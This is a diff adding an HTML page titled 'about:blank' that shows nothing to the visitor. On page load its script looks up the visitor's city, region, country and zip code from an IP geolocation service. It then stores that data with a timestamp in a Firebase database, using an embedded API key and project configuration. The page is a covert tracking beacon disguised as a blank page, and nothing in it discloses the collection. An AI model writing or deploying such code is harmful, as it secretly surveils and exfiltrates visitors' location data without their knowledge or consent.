@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+
+<head>
+    <title>about:blank</title>
+</head>
+<body>
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-app.js";
+        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyD4z2S9mXOsLvY2pZxgKrYlWJJXNHx5nMI",
+            authDomain: "sfo1923005.firebaseapp.com",
+            databaseURL: "https://sfo1923005-default-rtdb.firebaseio.com",
+            projectId: "sfo1923005",
+            storageBucket: "sfo1923005.firebasestorage.app",
+            messagingSenderId: "217173418712",
+            appId: "1:217173418712:web:caa4ad716cdbec48f1adad",
+            measurementId: "G-TPKDXMFBMQ"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        (async () => {
+            const api_url = 'https://free.freeipapi.com/api/json';
+            const response = await fetch(api_url);
+            const data = await response.json();
+            
+            const dbRef = ref(db, 'data');
+            const newDataRef = push(dbRef);
+
+            await set(newDataRef, {
+                city: data.cityName,
+                region: data.regionName,
+                country: data.countryName,
+                zip: data.zipCode,
+                time: new Date().toLocaleString()
+            });
+        })();
+    </script>
+</body>
